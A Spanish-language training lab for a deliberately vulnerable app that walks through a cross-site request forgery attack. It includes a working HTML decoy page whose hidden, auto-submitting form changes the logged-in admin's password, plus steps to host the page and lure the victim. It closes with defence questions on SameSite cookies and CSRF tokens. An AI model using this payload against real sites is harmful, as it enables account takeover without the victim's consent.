# Laboratorio 11: Cross-Site Request Forgery (CSRF)

## 🎯 Objetivo
Forzar a un usuario autenticado (la víctima) a realizar una acción no deseada sin su consentimiento, como cambiar su propia contraseña.

## 📋 Prerrequisitos
1.  **Entorno:** Cadel Academy en Modo Vulnerable.
2.  **Víctima:** Una sesión activa en el navegador (ej. como 'admin').
3.  **Atacante:** Un editor de texto y un servidor web simple (Python).

## 📝 Instrucciones Paso a Paso

La vulnerabilidad de CSRF existe porque los formularios de la aplicación que cambian el estado (como el de cambiar contraseña) no incluyen un token único y secreto para verificar que la petición se originó en la propia aplicación. El servidor confía ciegamente en la cookie de sesión del usuario.

### Paso 1: Crear la Página Maliciosa
En tu máquina de atacante (Kali), crea un archivo llamado `csrf_attack.html`. Este archivo contendrá un formulario oculto que imita al de "Cambiar Contraseña" del perfil.

```html
<html>
  <body>
    <h1 style="font-family: sans-serif;">Página de Gatitos Inofensiva</h1>
    <img src="https://placekitten.com/400/300" alt="Un gatito">

    <!-- Formulario CSRF oculto -->
    <form id="csrf-form" action="http://localhost:8080/profile" method="POST" style="display:none;">
      <input type="hidden" name="action" value="change_password" />
      <!-- Para este PoC, asumimos que el atacante conoce la contraseña actual.
           En otros escenarios (como publicar en un foro), no se necesitaría. -->
      <input type="hidden" name="current_password" value="admin123" />
      <input type="hidden" name="new_password" value="pwned123" />
    </form>

    <script>
      // Enviar el formulario automáticamente al cargar la página
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

### Paso 2: Servir la Página Maliciosa
1.  En la terminal de tu máquina atacante, en la misma carpeta donde guardaste `csrf_attack.html`, inicia un servidor web:
    ```bash
    python3 -m http.server 9000
    ```
2.  Tu página maliciosa ahora está disponible en `http://<TU_IP_KALI>:9000/csrf_attack.html`.

### Paso 3: Engañar a la Víctima
1.  Asegúrate de que en otro navegador (o en el mismo) tienes una sesión iniciada como 'admin' en `http://localhost:8080`.
2.  Ahora, como si fueras la víctima, visita la URL del atacante.
3.  Verás la página de gatitos por un instante. En segundo plano, tu navegador habrá enviado la petición `POST` a Cadel Academy, incluyendo tu cookie de sesión de 'admin'.

## 🏁 Verificación
1.  Intenta cerrar sesión en Cadel Academy y volver a entrar como `admin` con la contraseña original (`admin123`). Debería fallar.
2.  Intenta iniciar sesión con la nueva contraseña (`pwned123`). Debería funcionar.

## 🛡️ Preguntas de Reflexión
1.  ¿Cómo previene el modo seguro este ataque? (Pista: Revisa las cookies y busca el atributo `SameSite=Strict`).
2.  ¿Qué es un token CSRF y cómo se implementaría en el formulario para mitigar este riesgo?